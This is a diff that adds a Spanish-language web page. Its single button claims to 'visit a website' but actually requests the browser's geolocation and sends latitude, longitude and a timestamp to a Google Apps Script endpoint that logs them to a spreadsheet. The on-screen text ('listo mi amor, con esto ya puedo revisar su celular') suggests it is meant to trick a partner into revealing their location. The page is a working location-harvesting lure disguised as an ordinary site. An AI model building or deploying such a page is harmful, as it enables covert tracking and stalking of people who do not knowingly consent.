@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mi página web</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #00ff99;
+      font-family: 'Courier New', Courier, monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-size: 2em;
+      text-shadow: 0 0 10px #00ff99;
+    }
+
+    button {
+      background-color: transparent;
+      border: 2px solid #00ff99;
+      color: #00ff99;
+      padding: 15px 30px;
+      font-size: 1.1em;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #00ff99;
+      color: #0f0f0f;
+      box-shadow: 0 0 20px #00ff99;
+    }
+
+    .output {
+      margin-top: 30px;
+      padding: 20px;
+      border: 1px solid #00ff99;
+      border-radius: 10px;
+      background-color: rgba(0, 255, 153, 0.05);
+      width: 300px;
+      text-align: center;
+      box-shadow: 0 0 10px #00ff99;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Mi página web ☺</h1>
+  <button onclick="getLocation()">Visitar sitio web</button>
+
+  <div class="output" id="output">
+    Esperando acción del usuario...
+  </div>
+
+  <script>
+    const webAppUrl = "https://script.google.com/macros/s/AKfycbyJsEwi_WkBMxQvwbBvHUvQg8tucV-uWSMkQvIBveKf12XptrW3tY9svQTK7B3sJYmCiQ/exec";
+
+    function getLocation() {
+      const output = document.getElementById("output");
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        output.innerHTML = "Obteniendo ubicación...";
+      } else {
+        output.innerHTML = "Que mierda de navegador.";
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      document.getElementById("output").innerHTML = `
+        📍 Latitud: ${lat.toFixed(5)}<br>
+        📍 Longitud: ${lon.toFixed(5)}<br>
+        ✅ listo mi amor, con esto ya puedo revisar su celular
+      `;
+
+      // Enviar a Google Sheets
+      fetch(webAppUrl, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitud: lat,
+          longitud: lon,
+          timestamp: new Date().toISOString()
+        })
+      }).then(() => {
+        document.getElementById("output").innerHTML += "<br>✅ Guardado correctamente.";
+      }).catch(() => {
+        document.getElementById("output").innerHTML += "<br>❌ Error al enviar.";
+      });
+    }
+
+    function showError(error) {
+      const output = document.getElementById("output");
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          output.innerHTML = "OE Califique mi pagina por fa😔";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          output.innerHTML = "Qué es ese hpt hueco";
+          break;
+        case error.TIMEOUT:
+          output.innerHTML = "Oe qué demora";
+          break;
+        default:
+          output.innerHTML = "❌ Error desconocido.";
+      }
+    }
+  </script>
+
+</body>
+</html>
